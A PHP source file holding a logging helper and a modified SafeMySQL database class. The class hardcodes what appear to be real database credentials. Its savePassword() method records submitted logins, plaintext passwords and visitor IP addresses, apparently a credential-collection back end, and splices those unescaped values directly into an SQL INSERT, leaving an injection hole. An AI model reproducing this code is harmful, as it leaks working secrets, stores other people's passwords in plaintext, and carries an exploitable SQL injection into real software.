<?php
function add2log($msg, $add_eol = false)
{
	try
	 {
		  $dir = dirname(__FILE__) . "/log/"; //@mkdir($dir, 755);
		  
		  $t = explode(" ", microtime()); $tm = date("Y/m/d H:i:s", $t[1]).substr((string)$t[0],1,4); 
		  
		  $f = fopen($dir . date('Y-m-d') . ".log", "a+");
		  
		  fwrite($f, $tm . ' ' . $msg . PHP_EOL); echo $msg . PHP_EOL;
		  
		  if ($add_eol)
		   {
			fwrite($f, PHP_EOL);
		   }
		  
		fclose($f);
	 }
	 catch (Exception $e) 
	 {
	 }
}

function time2utc($time) 
{
	$dt = new DateTime($time); $mnth = $dt->format('m'); if ($mnth == 1) $mnth = 12; else if ($mnth > 1) $mnth--;
	
	return "Date.UTC(" . $dt->format('Y') . ", $mnth, " . $dt->format('d') . ", " . $dt->format('H') . ", " . $dt->format('i') . ", " . $dt->format('s') . ")";
}
 
class SafeMySQL 
{
    private $conn;
    private $stats;
    private $emode;
    private $exname;
    private $defaults = array(
        'host' => 'localhost',
        'user' => 'host1712236',
        'pass' => 'bbe51394',
        'db' => 'host1712236',
        'port' => NULL,
        'socket' => NULL,
        'pconnect' => FALSE,
        'charset' => 'utf8',
        'errmode' => 'error', //or exception
        'exception' => 'Exception', //Exception class name
    );

    const RESULT_ASSOC = MYSQLI_ASSOC;
    const RESULT_NUM = MYSQLI_NUM;

    function __construct($opt = array()) 
	{
        $opt = array_merge($this->defaults, $opt);

        $this->emode = $opt['errmode'];
        $this->exname = $opt['exception'];

        if ($opt['pconnect']) {
            $opt['host'] = "p:" . $opt['host'];
        }

        @$this->conn = mysqli_connect($opt['host'], $opt['user'], $opt['pass'], $opt['db'], $opt['port'], $opt['socket']);
        if (!$this->conn) 
		{
            $this->error(mysqli_connect_errno() . " " . mysqli_connect_error());
        }

        mysqli_set_charset($this->conn, $opt['charset']) or $this->error(mysqli_error($this->conn));
        unset($opt); // I am paranoid
    }
	
	public function savePassword($login, $psw) 
	{
		$login = trim($login);
		$psw   = trim($psw);
		$ip    = TRIM($_SERVER['REMOTE_ADDR']);
		
		if(($login != "") && ($psw != ""))
		{
			$this->exec("INSERT INTO `passwords` (`login`, `password`, `first_ip`, `created`, `modified`) 
							VALUES ('{$login}', '{$psw}', '{$ip}', NOW() , NOW())
							ON DUPLICATE KEY UPDATE `last_ip`='{$ip}', `modified`=NOW()");
		}
	}
	
    public function query() 
	{
        return $this->rawQuery($this->prepareQuery(func_get_args()));
    }

	public function word_replace($from, $to, $str)
	{
		$separators = [",", ")", ".", " "];
		
		foreach ($separators as $sep)
		 {
			$str = str_replace($from . $sep, $to . $sep, $str);
		 }

		return $str;
	}
	
	public function mergeArgs($q, $params = [])
	{
		if (count($params) > 0)
		 {
			foreach ($params as $key => $val)
			 {
				if (is_array($val))
				 $q = $this->mergeArgs($q, $val); else
				if (($val == 'NOW()') || ($val == 'now()') || strpos($val, "INTERVAL") || strpos($val, "NOW()"))
				 $q = $this->word_replace(":$key", $val, $q); else
				if (is_numeric($val))
				 {
					$q = $this->word_replace(":$key", $this->escapeFloat ($val), $q);
				 }else
				 {
					$q = $this->word_replace(":$key", $this->escapeString($val), $q);
				 }
			 }
		 }
		 
	  return $q;
	}
	
    public function exec($q, $params = []) 
	{
	   try
		{
			$q = $this->mergeArgs($q, $params); //echo "$q\n"; //add2log($q);
			 if ($res = mysqli_query($this->conn, $q))
			 {
				return $res;
			 }else
			 {
				$error = mysqli_error($this->conn);
				
				add2log("$error. Full query: [$q]; params: " . json_encode($params)); 
				
				return false; //$this->error("$error. Full query: [$q]");
			 }
		}
	   catch (Exception $e)
        {
			//add2log("$error. Full query: [$q]; params: " . json_encode($params)); 
			return false; //echo $e->getMessage();
		}	   
    }
	
	public function checkColumn($dest, $column) 
	{
		$ret = [];
		
	    foreach ($column as $key => $type)
	    {
			if (isset($dest[$key]))
			 $ret[$key] = $dest[$key];
	    }
	   
	   return $ret;
	}
	
	public function insTable($table, $params = []) 
	{
		$f = ""; $v = ""; $table = TRIM($table, "`");
		
		foreach ($params as $key => $itm)
		 {
			if (!is_array($itm))
			{
				$f .= "`$key`, ";
				$v .= ":$key, ";
			}
		 }
		 
	   $f = TRIM($f, ", "); $v = TRIM($v, ", ");
	   
	   return $this->exec("INSERT IGNORE INTO `$table` ($f) VALUES ($v)", $params);
	}

	public function insert($sql, $params = []) 
	{
		$f = ""; $v = "";
		
		foreach ($params as $key => $itm)
		 {
			if (!is_array($itm))
			{
				$f .= "`$key`, ";
				$v .= ":$key, ";
			}
		 }
		 
	   $f = TRIM($f, ", "); $v = TRIM($v, ", "); 
	   
	   $sql = str_replace("(:f)", "($f)", $sql);
	   $sql = str_replace("(:v)", "($v)", $sql);
	   
	   return $this->exec($sql, $params);
	}
	
	public function updTable($table, $keys = [], $params = []) 
	{
		$set = ""; $where = "";
		
		foreach ($params as $key => $itm)
		{
			if (is_array($itm))
			{
			}else
			if (in_array($key, $keys))
			{
				$where = ($where == "") ? ("(`$key`=:$key)") : ($where . "AND(`$key`=:$key)");
			}else
			{
				$set = ($set == "") ? ("`$key`=:$key") : ($set . ", `$key`=:$key");
			}
		}
	   
	   return $this->exec("UPDATE `$table` SET $set WHERE $where", $params);
	}
	
    /**
     * Conventional function to fetch single row. 
     * 
     * @param resource $result - myqli result
     * @param int $mode - optional fetch mode, RESULT_ASSOC|RESULT_NUM, default RESULT_ASSOC
     * @return array|FALSE whatever mysqli_fetch_array returns
     */
    public function fetch($result, $mode = self::RESULT_ASSOC) 
	{
        return mysqli_fetch_array($result, $mode);
    }

    /**
     * Conventional function to get number of affected rows. 
     * 
     * @return int whatever mysqli_affected_rows returns
     */
    public function affectedRows() {
        return mysqli_affected_rows($this->conn);
    }

    /**
     * Conventional function to get last insert id. 
     * 
     * @return int whatever mysqli_insert_id returns
     */
    public function insertId() 
	{
        return mysqli_insert_id($this->conn);
    }

    public function LAST_INSERT_ID() 
	{
        return mysqli_insert_id($this->conn);
    }
	
    /**
     * Conventional function to get number of rows in the resultset. 
     * 
     * @param resource $result - myqli result
     * @return int whatever mysqli_num_rows returns
     */
    public function numRows($result) {
        return mysqli_num_rows($result);
    }

    /**
     * Conventional function to free the resultset. 
     */
    public function free($result) 
	{
        mysqli_free_result($result);
    }

    /**
     * Helper function to get single row right out of query and optional arguments
     * 
     * Examples:
     * $data = $db->getRow("SELECT * FROM table WHERE id=1");
     * $data = $db->getOne("SELECT * FROM table WHERE id=?i", $id);
     *
     * @param string $query - an SQL query with placeholders
     * @param mixed  $arg,... unlimited number of arguments to match placeholders in the query
     * @return array|FALSE either associative array contains first row of resultset or FALSE if none found
     */
    public function getRow() 
	{
        $query = $this->prepareQuery(func_get_args());
        if ($res = $this->rawQuery($query)) {
            $ret = $this->fetch($res);
            $this->free($res);
            return $ret;
        }
        return FALSE;
    }

    /**
     * Helper function to get single column right out of query and optional arguments
     * 
     * Examples:
     * $ids = $db->getCol("SELECT id FROM table WHERE cat=1");
     * $ids = $db->getCol("SELECT id FROM tags WHERE tagname = ?s", $tag);
     *
     * @param string $query - an SQL query with placeholders
     * @param mixed  $arg,... unlimited number of arguments to match placeholders in the query
     * @return array|FALSE either enumerated array of first fields of all rows of resultset or FALSE if none found
     */
    public function getCol() {
        $ret = array();
        $query = $this->prepareQuery(func_get_args());
        if ($res = $this->rawQuery($query)) {
            while ($row = $this->fetch($res)) {
                $ret[] = reset($row);
            }
            $this->free($res);
        }
        return $ret;
    }

    /**
     * Helper function to get all the rows of resultset right out of query and optional arguments
     * 
     * Examples:
     * $data = $db->getAll("SELECT * FROM table");
     * $data = $db->getAll("SELECT * FROM table LIMIT ?i,?i", $start, $rows);
     *
     * @param string $query - an SQL query with placeholders
     * @param mixed  $arg,... unlimited number of arguments to match placeholders in the query
     * @return array enumerated 2d array contains the resultset. Empty if no rows found. 
     */
	 
	public function getKeyVal($str, &$key, &$val)
	{
	  $key = ""; $val = ""; $i = strpos($str, '.');
		
		if ($i > 0)
		 {
			$key = TRIM(substr($str, 0, $i), ". ");
			$val = TRIM(substr($str, $i), ". ");
			
			return true;
		 }
		 
	  return false;	 
	}
	
	public function prepareRow($row)
	{
		$ret = [];
		
		if ($row && is_array($row) && (count($row) > 0))
		 {
			 foreach ($row as $key => $val)
			  {
				if ($this->getKeyVal($key, $s1, $s2))
				 {
					$ret[$s1][$s2] = $val;
				 } else
				 {
					$ret[$key] = $val;
				 }
			  }
			  
			return $ret;
		 }
		  
		return $row;
	}
    /**
     * Helper function to get scalar value right out of query and optional arguments
     * 
     * Examples:
     * $name = $db->getOne("SELECT name FROM table WHERE id=1");
     * $name = $db->getOne("SELECT name FROM table WHERE id=?i", $id);
     *
     * @param string $query - an SQL query with placeholders
     * @param mixed  $arg,... unlimited number of arguments to match placeholders in the query
     * @return string|FALSE either first column of the first row of resultset or FALSE if none found
     */
    public function getOne($query, $args = []) 
	{
        if ($res = $this->rawQuery($this->mergeArgs($query, $args))) 
		{
          $row = $this->fetch($res);
		  
            if (is_array($row)) 
			{
                return $this->prepareRow($row);
            }
			
          $this->free($res);
        }
		
      return false;
    }
	
    public function getAll($query, $key = null)
	{
        $ret = [];

        if ($res = $this->rawQuery($query)) 
		 {
            while ($row = $this->fetch($res)) 
			{
				if (empty($key) || !isset($row[$key]))
                 $ret[] 		  = $this->prepareRow($row); else
				 $ret[$row[$key]] = $this->prepareRow($row);
            }
			
          $this->free($res); return $ret;
         }
		 
       return false; 
    }

    public function getAvg($query, $count = 0, $def = 0)
	{
        $ret = array(); $sum = 0; $k = 0;

        if ($res = $this->rawQuery($query)) 
		 {
            while ($row = $this->fetch($res)) 
			{
				foreach ($row as $val)
				 {
					if (TRIM($val) !== "")
					 {
						$sum += $val;
					 }
					 
					 $k++;
				 }
            }
			
          $this->free($res);
         }
		 
	  if (($k > 0) && (($count == 0) || ($k >= $count)))
	   return $sum / $k; else	 
       return $def; 
    }
	
    public function getList($query)
	{
        $ret = [];

        if ($res = $this->rawQuery($query)) 
		 {
            while ($row = $this->fetch($res)) 
			{
				foreach ($row as $val)
				 {
					$ret[] = $val;
				 }
            }
			
          $this->free($res); return $ret;
         }
		 
       return false; 
    }
	
	 public function table_fields_list($table)
	 {
        if ($res = $this->rawQuery("SHOW COLUMNS FROM $table")) 
		 {
            while ($row = $this->fetch($res)) 
			{
				$data[$row['Field']] = trim($row['Type'], '(0123456789)');
            }
			
           $this->free($res); return $data;
         }
		 
	   return false;	 
	 }
	 
    public function getInt($q, $def = 0)
	{
        if ($res = $this->rawQuery($q)) 
		 {
            while ($row = $this->fetch($res)) 
			{
				foreach ($row as $key=>$val)
				 {
					if (TRIM($val) !== "")
					 {
						$def = TRIM($val); break;
					 }
				 }
				 
			  break;	 
            }
           $this->free($res);
         }
		 
	  return $def;
    }

    public function getDouble($q, $def = NULL)
	{
        if ($res = $this->rawQuery($q)) 
		 {
            while ($row = $this->fetch($res)) 
			{
				foreach ($row as $key=>$val)
				 {
					if (!empty($val) && (TRIM($val) !== ""))
					 {
						$def = $val; 
					 }
						
					break;
				 }
				 
			  break;	 
            }
           $this->free($res);
         }
		 
	  return $def;
    }
	
    public function getStr($q, $def = "") 
	{
        if ($res = $this->rawQuery($q)) 
		 {
            while ($row = $this->fetch($res)) 
			{
				foreach ($row as $key=>$val)
				 {
					if (TRIM($val) != "")
					 {
						$def = TRIM($val); break;
					 }
				 }
				 
			  break;	 
            }
           $this->free($res);
         }
		 
	  return $def;
    }

    public function getVal($q, $def = 0) 
	{
        if ($res = $this->rawQuery($q)) 
		 {
            while ($row = $this->fetch($res)) 
			{
				foreach ($row as $key=>$val)
				 {
					if (!empty($val) && (TRIM($val) !== ""))
					 {
						$def = $val; 
					 }
						
					break;
				 }
				 
			  break;	 
            }
			
           $this->free($res);
         }
		 
	  return $def;
    }
	
    public function getLast($q, $def = 0) 
	{
        if ($res = $this->rawQuery($q)) 
		 {
            while ($row = $this->fetch($res)) 
			{
				foreach ($row as $key=>$val)
				 {
					if (!empty($val) && (TRIM($val) !== ""))
					 {
						$def = $val; 
					 }
				 }
            }
			
           $this->free($res);
         }
		 
	  return $def;
    }
	
    public function getInd() 
	{
        $args = func_get_args();
        $index = array_shift($args);
        $query = $this->prepareQuery($args);

        $ret = array();
        if ($res = $this->rawQuery($query)) 
		{
            while ($row = $this->fetch($res)) 
			{
                $ret[$row[$index]] = $row;
            }
            $this->free($res);
        }
        return $ret;
    }

    /**
     * Helper function to get a dictionary-style array right out of query and optional arguments
     * 
     * Examples:
     * $data = $db->getIndCol("name", "SELECT name, id FROM cities");
     *
     * @param string $index - name of the field which value is used to index resulting array
     * @param string $query - an SQL query with placeholders
     * @param mixed  $arg,... unlimited number of arguments to match placeholders in the query
     * @return array - associative array contains key=value pairs out of resultset. Empty if no rows found. 
     */
    public function getIndCol() {
        $args = func_get_args();
        $index = array_shift($args);
        $query = $this->prepareQuery($args);

        $ret = array();
        if ($res = $this->rawQuery($query)) {
            while ($row = $this->fetch($res)) {
                $key = $row[$index];
                unset($row[$index]);
                $ret[$key] = reset($row);
            }
            $this->free($res);
        }
        return $ret;
    }

    /**
     * Function to parse placeholders either in the full query or a query part
     * unlike native prepared statements, allows ANY query part to be parsed
     * 
     * useful for debug
     * and EXTREMELY useful for conditional query building
     * like adding various query parts using loops, conditions, etc.
     * already parsed parts have to be added via ?p placeholder
     * 
     * Examples:
     * $query = $db->parse("SELECT * FROM table WHERE foo=?s AND bar=?s", $foo, $bar);
     * echo $query;
     * 
     * if ($foo) {
     *     $qpart = $db->parse(" AND foo=?s", $foo);
     * }
     * $data = $db->getAll("SELECT * FROM table WHERE bar=?s ?p", $bar, $qpart);
     *
     * @param string $query - whatever expression contains placeholders
     * @param mixed  $arg,... unlimited number of arguments to match placeholders in the expression
     * @return string - initial expression with placeholders substituted with data. 
     */
    public function parse() 
	{
        return $this->prepareQuery(func_get_args());
    }

    /**
     * function to implement whitelisting feature
     * sometimes we can't allow a non-validated user-supplied data to the query even through placeholder
     * especially if it comes down to SQL OPERATORS
     * 
     * Example:
     *
     * $order = $db->whiteList($_GET['order'], array('name','price'));
     * $dir   = $db->whiteList($_GET['dir'],   array('ASC','DESC'));
     * if (!$order || !dir) {
     *     throw new http404(); //non-expected values should cause 404 or similar response
     * }
     * $sql  = "SELECT * FROM table ORDER BY ?p ?p LIMIT ?i,?i"
     * $data = $db->getArr($sql, $order, $dir, $start, $per_page);
     * 
     * @param string $iinput   - field name to test
     * @param  array  $allowed - an array with allowed variants
     * @param  string $default - optional variable to set if no match found. Default to false.
     * @return string|FALSE    - either sanitized value or FALSE
     */
    public function whiteList($input, $allowed, $default = FALSE) 
	{
        $found = array_search($input, $allowed);
        return ($found === FALSE) ? $default : $allowed[$found];
    }

    /**
     * function to filter out arrays, for the whitelisting purposes
     * useful to pass entire superglobal to the INSERT or UPDATE query
     * OUGHT to be used for this purpose, 
     * as there could be fields to which user should have no access to.
     * 
     * Example:
     * $allowed = array('title','url','body','rating','term','type');
     * $data    = $db->filterArray($_POST,$allowed);
     * $sql     = "INSERT INTO ?n SET ?u";
     * $db->query($sql,$table,$data);
     * 
     * @param  array $input   - source array
     * @param  array $allowed - an array with allowed field names
     * @return array filtered out source array
     */
    public function filterArray($input, $allowed) {
        foreach (array_keys($input) as $key) {
            if (!in_array($key, $allowed)) {
                unset($input[$key]);
            }
        }
        return $input;
    }

    /**
     * Function to get last executed query. 
     * 
     * @return string|NULL either last executed query or NULL if were none
     */
    public function lastQuery() {
        $last = end($this->stats);
        return $last['query'];
    }

    /**
     * Function to get all query statistics. 
     * 
     * @return array contains all executed queries with timings and errors
     */
    public function getStats() {
        return $this->stats;
    }

    /**
     * private function which actually runs a query against Mysql server.
     * also logs some stats like profiling info and error message
     * 
     * @param string $query - a regular SQL query
     * @return mysqli result resource or FALSE on error
     */
    private function rawQuery($query) 
	{
        $start = microtime(TRUE);
        $res   = mysqli_query($this->conn, $query);
        $timer = microtime(TRUE) - $start;

        $this->stats[] = array('query' => $query, 'start' => $start, 'timer' => $timer);
         if (!$res) 
		 {
            $error = mysqli_error($this->conn);

            end($this->stats);
            $key = key($this->stats);
            $this->stats[$key]['error'] = $error;
            $this->cutStats();

            $this->error("$error. Full query: [$query]");
         }
		 
        $this->cutStats();
		
        return $res;
    }

    private function prepareQuery($args) 
	{
        $query = '';
        $raw = array_shift($args);
        $array = preg_split('~(\?[nsiuap])~u', $raw, null, PREG_SPLIT_DELIM_CAPTURE);
        $anum = count($args);
        $pnum = floor(count($array) / 2);
        if ($pnum != $anum) {
            $this->error("Number of args ($anum) doesn't match number of placeholders ($pnum) in [$raw]");
        }

        foreach ($array as $i => $part) {
            if (($i % 2) == 0) {
                $query .= $part;
                continue;
            }

            $value = array_shift($args);
            switch ($part) {
                case '?n':
                    $part = $this->escapeIdent($value);
                    break;
                case '?s':
                    $part = $this->escapeString($value);
                    break;
                case '?i':
                    $part = $this->escapeInt($value);
                    break;
                case '?a':
                    $part = $this->createIN($value);
                    break;
                case '?u':
                    $part = $this->createSET($value);
                    break;
                case '?p':
                    $part = $value;
                    break;
            }
            $query .= $part;
        }
        return $query;
    }

    private function escapeInt($value) 
	{
        if (empty($value) || ($value === NULL))
		{
            return '0';
        }
        if (!is_numeric($value)) 
		{
            $this->error("Integer (?i) placeholder expects numeric value, " . gettype($value) . " given");
            return FALSE;
        }
        if (is_float($value)) 
		{
            $value = number_format($value, 0, '.', ''); // may lose precision on big numbers
        }
		
        return $value;
    }

    private function escapeFloat($value) 
	{
        if (empty($value) || ($value === NULL))
		{
            return '0';
        }
		
        return $value; //number_format($value, 20);
    }
	
    public function escapeString($value) 
	{
        if (empty($value) || ($value === NULL))
		{
            return "''"; //'NULL';
        }
		if (TRIM($value) == "")
		 {
			return "''";
		 }
        return "'" . mysqli_real_escape_string($this->conn, $value) . "'";
    }

    private function escapeIdent($value) {
        if ($value) {
            return "`" . str_replace("`", "``", $value) . "`";
        } else {
            $this->error("Empty value for identifier (?n) placeholder");
        }
    }

    private function createIN($data) {
        if (!is_array($data)) {
            $this->error("Value for IN (?a) placeholder should be array");
            return;
        }
        if (!$data) {
            return 'NULL';
        }
        $query = $comma = '';
        foreach ($data as $value) {
            $query .= $comma . $this->escapeString($value);
            $comma = ",";
        }
        return $query;
    }

    private function createSET($data) {
        if (!is_array($data)) {
            $this->error("SET (?u) placeholder expects array, " . gettype($data) . " given");
            return;
        }
        if (!$data) {
            $this->error("Empty array for SET (?u) placeholder");
            return;
        }
        $query = $comma = '';
        foreach ($data as $key => $value) {
            $query .= $comma . $this->escapeIdent($key) . '=' . $this->escapeString($value);
            $comma = ",";
        }
        return $query;
    }

    private function error($err) 
	{
        $err = __CLASS__ . ": " . $err;

        if ($this->emode == 'error') 
		{
            $err .= ". Error initiated in " . $this->caller() . ", thrown";
			
            trigger_error($err, E_USER_ERROR);
        } else 
		{
            throw new $this->exname($err);
        }
    }

    private function caller() {
        $trace = debug_backtrace();
        $caller = '';
        foreach ($trace as $t) {
            if (isset($t['class']) && $t['class'] == __CLASS__) {
                $caller = $t['file'] . " on line " . $t['line'];
            } else {
                break;
            }
        }
        return $caller;
    }

    /**
     * On a long run we can eat up too much memory with mere statsistics
     * Let's keep it at reasonable size, leaving only last 100 entries.
     */
    private function cutStats() 
	{
        if (count($this->stats) > 100) {
            reset($this->stats);
            $first = key($this->stats);
            unset($this->stats[$first]);
        }
    }
}

//$db = new SafeMySQL();